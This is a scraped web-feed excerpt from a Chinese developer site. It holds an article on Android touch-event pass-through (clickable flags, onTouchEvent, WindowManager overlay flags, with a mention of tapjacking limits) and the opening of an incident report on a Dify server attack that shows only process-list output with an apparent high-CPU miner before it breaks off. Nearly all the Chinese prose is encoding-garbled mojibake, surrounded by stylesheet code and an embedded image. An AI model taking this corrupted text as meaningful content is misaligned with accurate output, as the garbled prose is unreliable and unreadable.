100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. ç‚¹å‡»é€ä¼ é€»è¾‘</h2>
<p>Android äº‹ä»¶åˆ†å‘éµå¾ª Activity -&gt; Window -&gt; ViewGroup -&gt; View çš„é“¾è·¯ï¼Œé€ä¼ çš„å…³é”®åœ¨äº <strong>ViewGroup å¦‚ä½•åˆ†å‘äº‹ä»¶ç»™å­ View</strong>ã€‚</p>
<p>åœ¨ <code>ViewGroup.dispatchTouchEvent</code> ä¸­ï¼Œå¤„ç† <code>ACTION_DOWN</code> æ—¶ä¼šéå†å­ View å¯»æ‰¾æ¶ˆè´¹è€…ï¼Œé€ä¼ çš„æœ¬è´¨å°±æ˜¯æ§åˆ¶è¿™ä¸ªéå†è¿‡ç¨‹ã€‚</p>
<p>è¦å®ç°é€ä¼ ï¼Œå¿…é¡»è®©ä¸Šå±‚ View åœ¨ <code>dispatchTransformedTouchEvent</code> ä¸­è¿”å› <code>false</code>ï¼Œæˆ–è€…åœ¨ç¬¬ä¸€æ­¥å°±è¢«åˆ¤å®šä¸º <code>continue</code> è·³è¿‡ã€‚</p>
<p><a href="https://juejin.cn/post/7588109656041259054" target="_blank" title="https://juejin.cn/post/7588109656041259054">ç‚¹å‡»é˜…è¯»ï¼šAndroid äº‹ä»¶åˆ†å‘æœºåˆ¶ï¼ˆä¸€ï¼‰â€”â€” å…¨æµç¨‹æºç è§£æ</a></p>
<h2 data-id="heading-1">2. ç‚¹å‡»é€ä¼ çš„å®ç°</h2>
<h3 data-id="heading-2">2.1 å±æ€§æ§åˆ¶</h3>
<p>é€šè¿‡å±æ€§è®¾ç½®ä¸Šå±‚ View ä¸å¯ç‚¹å‡»ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">View</span>
    <span class="hljs-attr">android:clickable</span>=<span class="hljs-string">"false"</span>
    <span class="hljs-attr">android:focusable</span>=<span class="hljs-string">"false"</span> /&gt;</span>
</code></pre>
<h4 data-id="heading-3">æºç åŸç†</h4>
<p><code>View.onTouchEvent</code> é»˜è®¤å®ç°ä¸­ï¼Œåªæœ‰å½“ View æ˜¯ <code>CLICKABLE</code> æˆ– <code>LONG_CLICKABLE</code> ç­‰çŠ¶æ€æ—¶æ‰ä¼šè¿”å› <code>true</code>ã€‚å¦‚æœè®¾ä¸º falseï¼Œ<code>onTouchEvent</code> è¿”å› <code>false</code>ï¼ŒViewGroup çš„å¾ªç¯ä¼šç»§ç»­æ‰¾ä¸‹ä¸€ä¸ªå­ Viewï¼ˆå³ä¸‹å±‚ Viewï¼‰ã€‚è€Œ focusable="false" åˆ™æ˜¯ä¸ºäº†é˜²æ­¢éè§¦æ‘¸æ¨¡å¼ä¸‹çš„ç„¦ç‚¹æŠ¢å å’Œæ— éšœç¢å¹²æ‰°ã€‚</p>
<p>æ³¨ï¼šç»™ View è®¾ç½® setOnClickListener æ—¶ä¼šç›´æ¥ setClickable(true)ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onTouchEvent</span><span class="hljs-params">(MotionEvent event)</span> {
    <span class="hljs-comment">// æ˜¯å¦â€œå¯ç‚¹å‡»â€ (clickable)</span>
    <span class="hljs-comment">// åªè¦æ»¡è¶³ CLICKABLEã€LONG_CLICKABLEã€CONTEXT_CLICKABLE ä»»æ„ä¸€ä¸ªï¼Œå³è§†ä¸ºå¯ç‚¹å‡»ã€‚</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šfocusable å±æ€§ä¸å‚ä¸è¿™ä¸ª clickable å˜é‡çš„è®¡ç®—</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">clickable</span> <span class="hljs-operator">=</span> ((viewFlags &amp; CLICKABLE) == CLICKABLE
            || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)
            || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE;

    <span class="hljs-comment">// ... </span>
    <span class="hljs-comment">// åªæœ‰å½“ View æ˜¯ clickable çš„ï¼ˆæˆ–æœ‰ Tooltipï¼‰ï¼Œæ‰ä¼šè¿›å…¥æ­¤å—ã€‚</span>
    <span class="hljs-keyword">if</span> (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) {
        <span class="hljs-keyword">switch</span> (action) {
            <span class="hljs-keyword">case</span> MotionEvent.ACTION_UP:
                <span class="hljs-comment">// ... </span>
                <span class="hljs-comment">// å¤„ç† Focusable é€»è¾‘ (ä»…åœ¨ View å·²ç»æ¶ˆè´¹äº‹ä»¶çš„å‰æä¸‹)</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">focusTaken</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
                <span class="hljs-comment">// ç‚¹å‡»ä¼šè·å–ç„¦ç‚¹ï¼Ÿ</span>
                <span class="hljs-comment">// æ¡ä»¶ï¼šView æ˜¯ focusable çš„ + åœ¨ Touch æ¨¡å¼ä¸‹å…è®¸ focus + å½“å‰æ²¡ç„¦ç‚¹</span>
                <span class="hljs-keyword">if</span> (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) {
                    focusTaken = requestFocus(); 
                }

                <span class="hljs-comment">// æ‰§è¡Œç‚¹å‡»å›è°ƒ</span>
                <span class="hljs-keyword">if</span> (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) {
                    <span class="hljs-keyword">if</span> (!focusTaken) { <span class="hljs-comment">// å¦‚æœåˆšæ‰è·å–ç„¦ç‚¹å¤±è´¥ï¼ˆæˆ–ä¸éœ€è¦ï¼‰ï¼Œæ‰æ‰§è¡Œç‚¹å‡»</span>
                        performClickInternal(); <span class="hljs-comment">// -&gt; OnClickListener.onClick()</span>
                    }
                }
                <span class="hljs-keyword">break</span>;
                
            <span class="hljs-comment">// ... (çœç•¥ DOWN/MOVE å¤„ç†) ...</span>
        }

        <span class="hljs-comment">// æ¶ˆè´¹äº‹ä»¶</span>
        <span class="hljs-comment">// åªè¦è¿›å…¥äº† if (clickable) å—ï¼Œæœ€ç»ˆä¸€å®šè¿”å› trueã€‚</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
    }

    <span class="hljs-comment">// ä¸æ¶ˆè´¹äº‹ä»¶ </span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

</code></pre>
<h3 data-id="heading-4">2.2 é‡å†™ onTouchEvent è¿”å› false</h3>
<p>ç›´æ¥é‡å†™ onTouchEventï¼Œè¿”å› falseã€‚</p>
<p>æ³¨ï¼šå¦‚æœä½ åªåœ¨ <code>ACTION_DOWN</code> è¿”å› falseï¼Œé‚£ä¹ˆåç»­çš„ <code>MOVE</code> å’Œ <code>UP</code> äº‹ä»¶å°†ä¸ä¼šå†åˆ†å‘ç»™è¿™ä¸ª Viewã€‚ä½ åªèƒ½ç›‘å¬åˆ° DOWNã€‚</p>
<h3 data-id="heading-5">2.3 Window çº§åˆ«çš„é€ä¼  (æ‚¬æµ®çª—/ç³»ç»Ÿå±‚)</h3>
<p>è‹¥æ˜¯ <code>WindowManager</code> æ·»åŠ çš„ Viewã€‚</p>
<pre><code class="hljs language-java" lang="java">WindowManager.<span class="hljs-type">LayoutParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WindowManager</span>.LayoutParams();
<span class="hljs-comment">// å…³é”® Flagï¼šFLAG_NOT_TOUCHABLE</span>
<span class="hljs-comment">// è®¾ç½®åï¼Œäº‹ä»¶ç›´æ¥ç©¿é€è¿™ä¸ª Windowï¼Œä¼ é€’ç»™åé¢çš„ Window</span>
params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;

<span class="hljs-comment">// å¦‚æœæƒ³è¦è‡ªå·±å¤„ç†ä¸€éƒ¨åˆ†åŒºåŸŸï¼Œå…¶ä»–åŒºåŸŸé€ä¼ ï¼Œéœ€é…åˆ FLAG_NOT_TOUCH_MODAL</span>
params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
</code></pre>
<p>Android 12+ å¯¹éç³»ç»Ÿåº”ç”¨çš„è§¦æ‘¸äº‹ä»¶å®‰å…¨æ€§åšäº†é™åˆ¶ï¼ˆé˜²æ­¢ Tapjacking æ”»å‡»ï¼‰ï¼Œè®¾ç½®é€æ˜ Window é€ä¼ äº‹ä»¶æ—¶ï¼Œå¦‚æœé€æ˜åº¦è¿‡ä½æˆ–é®æŒ¡æ•æ„ŸåŒºåŸŸï¼Œäº‹ä»¶å¯èƒ½ä¼šè¢«ç³»ç»Ÿæ‹¦æˆªï¼Œä½†åœ¨åŒä¸ª UID åº”ç”¨å†…é€šå¸¸ä¸å—é™ã€‚</p>
<h2 data-id="heading-6">3. å®æˆ˜</h2>
<h3 data-id="heading-7">3.1 é€æ˜åº¦é™·é˜±</h3>
<ol>
<li><strong>View.setVisibility(INVISIBLE/GONE)</strong> : View ä¸å‚ä¸ç»˜åˆ¶ï¼Œä¸” <code>canReceivePointerEvents()</code> è¿”å› falseï¼Œäº‹ä»¶<strong>å¤©ç„¶é€ä¼ </strong>ã€‚</li>
<li><strong>View.setAlpha(0)</strong> : View åªæ˜¯å…¨é€æ˜ï¼Œä½†ä¾ç„¶å­˜åœ¨äºå¸ƒå±€ä¸­ï¼Œä¾ç„¶å‚ä¸äº‹ä»¶åˆ†å‘ã€‚å¦‚æœä¸è®¾ <code>clickable=false</code>ï¼Œå®ƒå°±æ˜¯ä¸€å µé€æ˜å¢™ï¼Œä¼šæ‹¦æˆªæ‰€æœ‰äº‹ä»¶ã€‚</li>
</ol>
<h3 data-id="heading-8">3.2 äº‹ä»¶åºåˆ—æ–­è£‚</h3>
<p><strong>ç°è±¡ï¼š</strong> ä¸Šå±‚ View æƒ³é€šè¿‡ <code>onTouchEvent</code> ç›‘å¬ç”¨æˆ·çš„æ»‘åŠ¨è½¨è¿¹ï¼ˆMOVEï¼‰ï¼ŒåŒæ—¶è®©ä¸‹å±‚ View ä¹Ÿèƒ½å“åº”ç‚¹å‡»ã€‚äºæ˜¯ä¸Šå±‚åœ¨ DOWN æ—¶è¿”å› <code>false</code>ã€‚</p>
<p><strong>ç»“æœï¼š</strong> ä¸Šå±‚ View æ ¹æœ¬æ”¶ä¸åˆ° MOVE å’Œ UPã€‚</p>
<p><strong>è§£æ³•ï¼š</strong> è¿™ç§â€œæ—¢è¦åˆè¦â€çš„éœ€æ±‚ï¼ˆåŒå±‚å“åº”ï¼‰ï¼Œé€šå¸¸ä¸èƒ½é€šè¿‡ç®€å•çš„ return false å®ç°ã€‚</p>
<ul>
<li><em>æ–¹æ³• Aï¼š</em> ä¸Šå±‚æ‹¦æˆªäº‹ä»¶ï¼ˆreturn trueï¼‰ï¼Œè‡ªå·±åœ¨ <code>onTouchEvent</code> é‡Œå¤„ç†å®Œåï¼Œ<strong>æ‰‹åŠ¨</strong>è°ƒç”¨ä¸‹å±‚ View çš„ <code>dispatchTouchEvent</code>ï¼ˆè¿™ç§å«äº‹ä»¶æ³¨å…¥ï¼Œæ¯”è¾ƒ Hackï¼‰ã€‚</li>
<li><em>æ–¹æ³• Bï¼š</em> ä½¿ç”¨ <code>onInterceptTouchEvent</code>ã€‚</li>
</ul>
<h3 data-id="heading-9">3.3 ImageView é€ä¼ </h3>
<p>ä¸ Button ä¸åŒï¼Œ<strong>ImageView é»˜è®¤ <code>android:clickable="false"</code></strong> ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼Œå¦‚æœä½ åªæ˜¯åœ¨ä¸€ä¸ª FrameLayout ä¸­æŠŠä¸€ä¸ª ImageView ç›–åœ¨ Button ä¸Šï¼Œä¸åšä»»ä½•ä»£ç è®¾ç½®ï¼Œç‚¹å‡»äº‹ä»¶ä¼šè‡ªåŠ¨â€œç©¿é€â€ ImageViewï¼Œè¢«åº•ä¸‹çš„ Button å“åº”ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘çš„difyè¢«ç²¾å‡†æ”»å‡»äº†(CVE-2025-55182)]]></title>    <link>https://juejin.cn/post/7588704463620964371</link>    <guid>https://juejin.cn/post/7588704463620964371</guid>    <pubDate>2025-12-29T07:04:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463620964371" data-draft-id="7588570963295322155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘çš„difyè¢«ç²¾å‡†æ”»å‡»äº†(CVE-2025-55182)"/> <meta itemprop="keywords" content="React.js,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-29T07:04:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç„¶éº¦"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824728605"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘çš„difyè¢«ç²¾å‡†æ”»å‡»äº†(CVE-2025-55182)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824728605/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç„¶éº¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:04:23.000Z" title="Mon Dec 29 2025 07:04:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è®°ä¸€æ¬¡ dify è¢«æ”»å‡»çš„ä¾‹å­</p>
</blockquote>
<p>åœ¨æœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„ dify åº”ç”¨ï¼Œçªç„¶ä¸èƒ½è®¿é—®äº†ï¼Œè¿˜ä»¥ä¸º docker æœåŠ¡æŒ‚æ‰äº†ï¼Œç™»å½•åˆ°æœºå™¨ä¸Šï¼Œå‘ç° CPU é£™é«˜ã€‚</p>
<p><code>top</code> ä¸‹æŸ¥çœ‹è¿›ç¨‹</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">~$</span> <span class="hljs-string">top</span>
    <span class="hljs-string">PID</span> <span class="hljs-string">USER</span>      <span class="hljs-string">PR</span>  <span class="hljs-string">NI</span>    <span class="hljs-string">VIRT</span>    <span class="hljs-string">RES</span>    <span class="hljs-string">SHR</span> <span class="hljs-string">S</span>  <span class="hljs-string">%CPU</span>  <span class="hljs-string">%MEM</span>     <span class="hljs-string">TIME+</span> <span class="hljs-string">COMMAND</span>                                                                               
 <span class="hljs-number">121817</span> <span class="hljs-number">1001      </span><span class="hljs-number">25</span>   <span class="hljs-number">5</span>  <span class="hljs-number">313340</span> <span class="hljs-number">276072</span>   <span class="hljs-number">4224 </span><span class="hljs-string">S</span> <span class="hljs-number">298.7</span>   <span class="hljs-number">3.4</span>  <span class="hljs-number">93</span><span class="hljs-string">:39.70</span> <span class="hljs-string">hash</span>                                                                                  
  <span class="hljs-number">46503</span> <span class="hljs-number">1001      </span><span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">20.</span><span class="hljs-string">8g</span> <span class="hljs-number">242688</span>  <span class="hljs-number">60160</span> <span class="hljs-string">S</span>   <span class="hljs-number">1.7</span>   <span class="hljs-number">3.0</span>   <span class="hljs-number">0</span><span class="hljs-string">:13.67</span> <span class="hljs-string">next-server</span> <span class="hljs-string">(v1</span>                                                                       
    <span class="hljs-number">801</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">2320424</span>  <span class="hljs-number">62520</span>  <span class="hljs-number">35456</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.8</span>   <span class="hljs-number">0</span><span class="hljs-string">:31.39</span> <span class="hljs-string">containerd</span>                                                                            
   <span class="hljs-number">1036 </span><span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">3488664</span> <span class="hljs-number">101828</span>  <span class="hljs-number">55296</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">1.3</span>   <span class="hljs-number">1</span><span class="hljs-string">:01.56</span> <span class="hljs-string">dockerd</span>                                                                               
  <span class="hljs-number">45932</span> <span class="hljs-string">dnsmasq</span>   <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">34040</span>  <span class="hljs-number">11688</span>   <span class="hljs-number">4864 </span><span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.1</span>   <span class="hljs-number">0</span><span class="hljs-string">:10.21</span> <span class="hljs-string">redis-server</span>                                                                          
  <span class="hljs-number">47163</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">1417724</span> <span class="hljs-number">527424</span>  <span class="hljs-number">95488</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">6.5</span>   <span class="hljs-number">0</span><span class="hljs-string">:22.60</span> <span class="hljs-string">celery</span>                                                                                
  <span class="hljs-number">47273</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span> <span class="hljs-number">1287992</span>  <span class="hljs-number">72712</span>  <span class="hljs-number">39808</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.9</span>   <span class="hljs-number">0</span><span class="hljs-string">:10.38</span> <span class="hljs-string">main</span>                                                                                  
  <span class="hljs-number">47696</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">152308</span>  <span class="hljs-number">66796</span>  <span class="hljs-number">19584</span> <span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.8</span>   <span class="hljs-number">0</span><span class="hljs-string">:02.71</span> <span class="hljs-string">python</span>                                                                                
